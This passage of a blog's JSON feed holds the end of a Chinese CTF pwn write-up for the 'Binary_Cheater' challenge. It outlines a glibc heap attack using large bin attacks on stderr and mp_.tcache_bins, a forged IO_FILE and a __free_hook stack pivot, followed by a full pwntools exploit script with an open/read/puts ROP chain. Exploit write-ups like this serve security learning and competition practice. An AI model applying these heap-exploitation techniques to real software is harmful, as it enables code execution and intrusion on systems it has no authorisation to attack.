函数，由于本函数不是在程序中显式调用的，那么关于程序中对于 free_hook 的检查也不用管了，这样我们可以延续之前 攻击 free_hook 的思路，把 free_hook 指向一个 gadget 执行栈迁移到我们的 orw 链上</li>\n<li>说了这么多，那么怎么调用 io_str_overflow 函数呢，我们可以使用 assert 判断失败来调用，将 top chunk 改得比将要申请的 chunk 小即可</li>\n<li>如何让  free_hook 在之后的 malloc 中被申请呢？我们可以通过修改 mp_.tcache_bins 让 tcache 堆管理块让我们看起来增大，之后在对应位置布置对应大小的 entry 即可</li>\n</ol>\n<p>综上所述</p>\n<ol>\n<li>泄露地址</li>\n<li>large bin attack 攻击 stderr ，在对应堆块伪造 io file</li>\n<li>large bin attack 攻击 mp_.tcache_bins，在 tcache 管理块对应大小位置布置 __free_hook 的 entry</li>\n<li>在需要 被复制的堆块写入 gadget</li>\n<li>修改 top chunk</li>\n<li>申请堆块 触发 assert</li>\n</ol>\n<h2 id=\"exp-2\"><a class=\"markdownIt-Anchor\" href=\"#exp-2\">#</a> Exp</h2>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token comment\"># -*- encoding: utf-8 -*-</span>\n<span class=\"token keyword\">import</span> sys \n<span class=\"token keyword\">import</span> os \n<span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span> \n<span class=\"token comment\"># context.update( os = 'linux', arch = 'amd64',timeout = 1)</span>\nbinary <span class=\"token operator\">=</span> <span class=\"token string\">'./Binary_Cheater'</span>\nos<span class=\"token punctuation\">.</span>system<span class=\"token punctuation\">(</span><span class=\"token string\">'chmod +x %s'</span><span class=\"token operator\">%</span>binary<span class=\"token punctuation\">)</span>\nelf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span>\nlibc <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>libc\n<span class=\"token comment\"># libc = ELF('')</span>\ncontext<span class=\"token punctuation\">.</span>binary <span class=\"token operator\">=</span> binary\nDEBUG <span class=\"token operator\">=</span> <span class=\"token number\">1</span>\n<span class=\"token keyword\">if</span> DEBUG<span class=\"token punctuation\">:</span>\n    libc <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>libc\n    <span class=\"token comment\"># context.log_level = 'debug' </span>\n    p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span>\n    <span class=\"token comment\"># p = process(['qemu-arm', binary])</span>\n    <span class=\"token comment\"># p = process(['qemu-arm', binary,'-g','1234'])</span>\n    <span class=\"token comment\"># p = process(['qemu-aarch64','-L','','-g','1234',binary])</span>\n<span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n    host <span class=\"token operator\">=</span> <span class=\"token string\">''</span>\n    port <span class=\"token operator\">=</span> <span class=\"token string\">''</span>\n    p <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span>host<span class=\"token punctuation\">,</span>port<span class=\"token punctuation\">)</span>\n\nl64 <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'\\x7f'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nl32 <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> u32<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'\\xf7'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">4</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nsla <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b        <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nsa  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b        <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nlg  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> name<span class=\"token punctuation\">,</span>data  <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>success<span class=\"token punctuation\">(</span>name <span class=\"token operator\">+</span> <span class=\"token string\">': 0x%x'</span> <span class=\"token operator\">%</span> data<span class=\"token punctuation\">)</span>\nse  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> payload    <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\nrl  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\nsl  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> payload    <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\nru  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a          <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nrint<span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> x <span class=\"token operator\">=</span> <span class=\"token number\">12</span>     <span class=\"token punctuation\">:</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span> p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span>\n\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">dbg</span><span class=\"token punctuation\">(</span> b <span class=\"token operator\">=</span> null<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>b <span class=\"token operator\">==</span> null<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span>\n        pause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n        gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span><span class=\"token string\">'b %s'</span><span class=\"token operator\">%</span>b<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">cmd</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'>'</span><span class=\"token punctuation\">,</span>num<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">add</span><span class=\"token punctuation\">(</span>size <span class=\"token punctuation\">,</span> content <span class=\"token operator\">=</span> <span class=\"token string\">'a\\n'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    cmd<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'Size'</span> <span class=\"token punctuation\">,</span> size<span class=\"token punctuation\">)</span>\n    sa<span class=\"token punctuation\">(</span><span class=\"token string\">'Content'</span> <span class=\"token punctuation\">,</span> content<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">edit</span><span class=\"token punctuation\">(</span>idx <span class=\"token punctuation\">,</span> content <span class=\"token operator\">=</span> <span class=\"token string\">'a'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    cmd<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'Index'</span> <span class=\"token punctuation\">,</span> idx<span class=\"token punctuation\">)</span>\n    sa<span class=\"token punctuation\">(</span><span class=\"token string\">'Content'</span> <span class=\"token punctuation\">,</span> content<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">delete</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    cmd<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'Index'</span> <span class=\"token punctuation\">,</span> idx<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">show</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    cmd<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'Index'</span> <span class=\"token punctuation\">,</span> idx<span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># one_gad = one_gadget(libc.path)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">attack</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    \n    add<span class=\"token punctuation\">(</span><span class=\"token number\">0x418</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># 0 large bin 辅助快</span>\n    add<span class=\"token punctuation\">(</span><span class=\"token number\">0x418</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># 1 防止合并</span>\n    add<span class=\"token punctuation\">(</span><span class=\"token number\">0x428</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># 2 large bin 攻击块，地址泄露块</span>\n    add<span class=\"token punctuation\">(</span><span class=\"token number\">0x428</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># 3</span>\n    delete<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\n    add<span class=\"token punctuation\">(</span><span class=\"token number\">0x450</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># 4 把 unsorted bin 块挤进 large</span>\n    show<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\n\n    main_arena_addr <span class=\"token operator\">=</span> l64<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    __malloc_hook <span class=\"token operator\">=</span> main_arena_addr <span class=\"token operator\">-</span> <span class=\"token number\">0x450</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x10</span>\n    libc<span class=\"token punctuation\">.</span>address <span class=\"token operator\">=</span> __malloc_hook <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'__malloc_hook'</span><span class=\"token punctuation\">]</span>\n    __free_hook <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'__free_hook'</span><span class=\"token punctuation\">]</span>\n    stderr <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'stderr'</span><span class=\"token punctuation\">]</span>\n    IO_str_jumps <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>address <span class=\"token operator\">+</span> <span class=\"token number\">0x1e5580</span>\n    setcontext <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'setcontext'</span><span class=\"token punctuation\">]</span>\n    mp_ <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>address  <span class=\"token operator\">+</span> <span class=\"token number\">0x1e32d0</span>\n\n    delete<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n\n    fake_chunk_large <span class=\"token operator\">=</span> flat<span class=\"token punctuation\">(</span>\n        main_arena_addr <span class=\"token punctuation\">,</span> main_arena_addr<span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0</span> <span class=\"token punctuation\">,</span> stderr <span class=\"token operator\">-</span> <span class=\"token number\">0x20</span>\n    <span class=\"token punctuation\">)</span>\n\n    <span class=\"token comment\"># 此时 2在 large bin 中，0在 unsorted bin 中</span>\n    edit<span class=\"token punctuation\">(</span><span class=\"token number\">2</span> <span class=\"token punctuation\">,</span> fake_chunk_large <span class=\"token punctuation\">)</span>\n    add<span class=\"token punctuation\">(</span> <span class=\"token number\">0x450</span> <span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 5 把 0 块挤进 large</span>\n    <span class=\"token comment\"># dbg()</span>\n\n    <span class=\"token comment\"># 触发 large bin attack 此时堆地址被写入 stderr 中</span>\n\n    show<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\n\n    heap_base <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'\\n'</span><span class=\"token punctuation\">,</span> drop<span class=\"token operator\">=</span><span class=\"token boolean\">True</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x2b0</span>\n    lg<span class=\"token punctuation\">(</span><span class=\"token string\">'heap_base'</span><span class=\"token punctuation\">,</span>heap_base<span class=\"token punctuation\">)</span>\n\n    <span class=\"token comment\"># --- 修复因为攻击而被破坏的 large bin ---</span>\n    edit<span class=\"token punctuation\">(</span><span class=\"token number\">2</span> <span class=\"token punctuation\">,</span> flat<span class=\"token punctuation\">(</span> heap_base <span class=\"token operator\">+</span> <span class=\"token number\">0x2b0</span> <span class=\"token punctuation\">,</span> main_arena_addr <span class=\"token punctuation\">,</span> heap_base <span class=\"token operator\">+</span> <span class=\"token number\">0x2b0</span> <span class=\"token punctuation\">,</span> heap_base <span class=\"token operator\">+</span> <span class=\"token number\">0x2b0</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span>\n    edit<span class=\"token punctuation\">(</span><span class=\"token number\">0</span> <span class=\"token punctuation\">,</span> flat<span class=\"token punctuation\">(</span> main_arena_addr <span class=\"token punctuation\">,</span> heap_base <span class=\"token operator\">+</span> <span class=\"token number\">0xaf0</span> <span class=\"token punctuation\">,</span> heap_base <span class=\"token operator\">+</span> <span class=\"token number\">0xaf0</span> <span class=\"token punctuation\">,</span> heap_base <span class=\"token operator\">+</span> <span class=\"token number\">0xaf0</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span>\n    <span class=\"token comment\"># --- 修复因为攻击而被破坏的 large bin ---</span>\n\n    <span class=\"token comment\"># 其实修复也很简单，我们只要还原到没有攻击的状态即可</span>\n\n    add<span class=\"token punctuation\">(</span> <span class=\"token number\">0x418</span> <span class=\"token punctuation\">)</span> <span class=\"token comment\"># 6 0</span>\n    add<span class=\"token punctuation\">(</span> <span class=\"token number\">0x428</span> <span class=\"token punctuation\">)</span> <span class=\"token comment\"># 7 2</span>\n    <span class=\"token comment\"># bin 至此全部清空 </span>\n\n    add<span class=\"token punctuation\">(</span><span class=\"token number\">0x450</span><span class=\"token punctuation\">)</span>\n    add<span class=\"token punctuation\">(</span><span class=\"token number\">0x450</span><span class=\"token punctuation\">)</span>\n    add<span class=\"token punctuation\">(</span><span class=\"token number\">0x450</span><span class=\"token punctuation\">)</span>\n    delete<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span>\n    delete<span class=\"token punctuation\">(</span><span class=\"token number\">9</span><span class=\"token punctuation\">)</span>\n    delete<span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span>\n\n    delete<span class=\"token punctuation\">(</span><span class=\"token number\">7</span><span class=\"token punctuation\">)</span>\n    add<span class=\"token punctuation\">(</span><span class=\"token number\">0x450</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># 11</span>\n    fake_chunk_large <span class=\"token operator\">=</span> flat<span class=\"token punctuation\">(</span>\n        main_arena_addr <span class=\"token punctuation\">,</span> main_arena_addr<span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0</span> <span class=\"token punctuation\">,</span> mp_ <span class=\"token operator\">-</span> <span class=\"token number\">0x20</span><span class=\"token punctuation\">,</span>\n    <span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>__free_hook<span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">0x50</span>\n    <span class=\"token comment\"># 这里指向 free_hook 的指针会被识别成对应大小 tcache 块的指针</span>\n    <span class=\"token comment\"># 除此之外，前面还有个地方需要为 1 </span>\n    <span class=\"token comment\"># 分别对应 entry 和 counts</span>\n\n    edit<span class=\"token punctuation\">(</span><span class=\"token number\">7</span> <span class=\"token punctuation\">,</span> fake_chunk_large<span class=\"token punctuation\">)</span>\n\n    delete<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span>\n    add<span class=\"token punctuation\">(</span><span class=\"token number\">0x450</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#12</span>\n    <span class=\"token comment\"># 第二次 large bin 攻击 mp_.tcache_bins</span>\n\n    new_size <span class=\"token operator\">=</span> <span class=\"token number\">0x1592</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x40</span>\n    old_blen <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>new_size <span class=\"token operator\">-</span> <span class=\"token number\">100</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">//</span> <span class=\"token number\">2</span>\n\n    fake_IO_FILE <span class=\"token operator\">=</span> flat<span class=\"token punctuation\">(</span>\n        <span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">0xffffffffffff</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span>\n        heap_base <span class=\"token operator\">+</span> <span class=\"token number\">0x2080</span> <span class=\"token punctuation\">,</span> heap_base <span class=\"token operator\">+</span> <span class=\"token number\">0x2080</span> <span class=\"token operator\">+</span> old_blen<span class=\"token punctuation\">,</span>\n        <span class=\"token string\">'\\x00'</span><span class=\"token operator\">*</span><span class=\"token number\">0x40</span> <span class=\"token punctuation\">,</span> heap_base<span class=\"token punctuation\">,</span>\n        <span class=\"token string\">'\\x00'</span><span class=\"token operator\">*</span><span class=\"token number\">0x30</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span>\n        IO_str_jumps <span class=\"token operator\">+</span> <span class=\"token number\">0x18</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x38</span>\n    <span class=\"token punctuation\">)</span>\n\n    edit<span class=\"token punctuation\">(</span><span class=\"token number\">6</span> <span class=\"token punctuation\">,</span> fake_IO_FILE<span class=\"token punctuation\">)</span>\n\n    __free_hook <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'__free_hook'</span><span class=\"token punctuation\">]</span>\n    magic <span class=\"token operator\">=</span> <span class=\"token number\">0x14e72a</span> <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>address\n    \n    \n    read_addr <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'read'</span><span class=\"token punctuation\">]</span>\n    open_addr <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'open'</span><span class=\"token punctuation\">]</span>\n    puts_addr <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span>\n    ret <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">(</span>asm<span class=\"token punctuation\">(</span><span class=\"token string\">'ret'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    leave_ret <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">(</span>asm<span class=\"token punctuation\">(</span><span class=\"token string\">'leave;ret'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    pop_rax_ret <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">(</span>asm<span class=\"token punctuation\">(</span><span class=\"token string\">'pop rax; ret'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    pop_rdi_ret <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">(</span>asm<span class=\"token punctuation\">(</span><span class=\"token string\">'pop rdi; ret'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    pop_rsi_ret <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">(</span>asm<span class=\"token punctuation\">(</span><span class=\"token string\">'pop rsi; ret'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    pop_r13_pop_r15_ret <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">(</span>asm<span class=\"token punctuation\">(</span><span class=\"token string\">'pop r12 ; pop r13 ; ret'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    pop_rdx_pop_rbx_ret <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">(</span>asm<span class=\"token punctuation\">(</span><span class=\"token string\">'pop rdx ; pop rbx ; ret'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    \n    magic_chain  <span class=\"token operator\">=</span> flat<span class=\"token punctuation\">(</span>\n        __free_hook <span class=\"token operator\">+</span> <span class=\"token number\">0x8</span><span class=\"token punctuation\">,</span> pop_r13_pop_r15_ret <span class=\"token punctuation\">,</span> \n        __free_hook <span class=\"token operator\">+</span> <span class=\"token number\">0x8</span><span class=\"token punctuation\">,</span> __free_hook <span class=\"token operator\">+</span> <span class=\"token number\">0x10</span> <span class=\"token punctuation\">,</span>\n        pop_rdx_pop_rbx_ret<span class=\"token punctuation\">,</span> <span class=\"token number\">0x300</span> <span class=\"token punctuation\">,</span>\n        leave_ret<span class=\"token punctuation\">,</span> pop_rsi_ret<span class=\"token punctuation\">,</span>\n        __free_hook <span class=\"token operator\">+</span> <span class=\"token number\">0x8</span> <span class=\"token punctuation\">,</span> pop_rdi_ret <span class=\"token punctuation\">,</span> \n        <span class=\"token number\">0</span> <span class=\"token punctuation\">,</span> read_addr \n    <span class=\"token punctuation\">)</span>\n    <span class=\"token comment\"># len magic_chain 0x60</span>\n    flag_addr <span class=\"token operator\">=</span> __free_hook <span class=\"token operator\">+</span> <span class=\"token number\">0x100</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>magic_chain<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token number\">8</span>\n    chain <span class=\"token operator\">=</span> flat<span class=\"token punctuation\">(</span>\n        pop_rdi_ret <span class=\"token punctuation\">,</span> flag_addr <span class=\"token punctuation\">,</span> pop_rsi_ret <span class=\"token punctuation\">,</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">,</span> open_addr<span class=\"token punctuation\">,</span>\n        pop_rdi_ret <span class=\"token punctuation\">,</span> <span class=\"token number\">3</span> <span class=\"token punctuation\">,</span> pop_rsi_ret <span class=\"token punctuation\">,</span> flag_addr <span class=\"token punctuation\">,</span> pop_rdx_pop_rbx_ret <span class=\"token punctuation\">,</span> <span class=\"token number\">0x100</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">,</span> read_addr<span class=\"token punctuation\">,</span>\n        pop_rdi_ret <span class=\"token punctuation\">,</span> flag_addr <span class=\"token punctuation\">,</span> puts_addr\n    <span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">0x100</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">'flag\\x00'</span>\n    <span class=\"token comment\"># len chain 0x80</span>\n    \n    payload <span class=\"token operator\">=</span> flat<span class=\"token punctuation\">(</span> magic <span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> magic_chain\n    <span class=\"token comment\"># dbg('free')</span>\n    \n    edit<span class=\"token punctuation\">(</span><span class=\"token number\">9</span> <span class=\"token punctuation\">,</span> payload<span class=\"token punctuation\">)</span>\n    add<span class=\"token punctuation\">(</span><span class=\"token number\">0x430</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#13</span>\n    edit<span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span> <span class=\"token operator\">*</span> <span class=\"token number\">0x438</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x200</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n    <span class=\"token comment\"># dbg('*__vfprintf_internal+273')</span>\n    cmd<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">\"ize:\"</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x440</span><span class=\"token punctuation\">)</span>\n\n    payload <span class=\"token operator\">=</span>p64<span class=\"token punctuation\">(</span>ret<span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">0xc</span> <span class=\"token operator\">+</span> chain\n    se<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\n\n    <span class=\"token string\">''</span>\n\nattack<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># p.success(getShell())</span>\np<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token triple-quoted-string string\">'''\n@File    :   Binary_Cheater.py\n@Time    :   2021/10/25 17:05:27\n@Author  :   Niyah \n'''</span></code></pre>\n",
            "tags": [
                "CTF",
                "PWN",
                "堆"
            ]
        },
        {
            "id": "http://niyah.cn/CTF/%E9%80%82%E7%94%A8%E4%BA%8E%E9%AB%98%E7%89%88%E6%9C%AC%E7%9A%84house/",
            "url": "http://niyah.cn/CTF/%E9%80%82%E7%94%A8%E4%BA%8E%E9%AB%98%E7%89%88%E6%9C%AC%E7%9A%84house/",
            "title": "适用于高版本的三大house",
            "date_published": "2022-01-27T16:00:00.000Z",
